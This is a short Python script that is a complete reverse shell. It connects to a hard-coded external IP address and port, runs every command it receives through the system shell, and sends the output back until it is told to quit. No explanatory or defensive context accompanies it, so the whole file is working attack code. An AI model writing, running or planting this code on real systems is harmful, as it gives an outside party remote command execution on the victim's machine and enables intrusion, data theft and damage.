#!/usr/bin/env python

import socket,subprocess
CBACKIP='185.26.124.86'
CBACKPORT=12346
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((CBACKIP, CBACKPORT))
s.send('[*] Connection Established!')
while 1:
     data = s.recv(1024)
     if data == "quit": break
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value)
s.close()
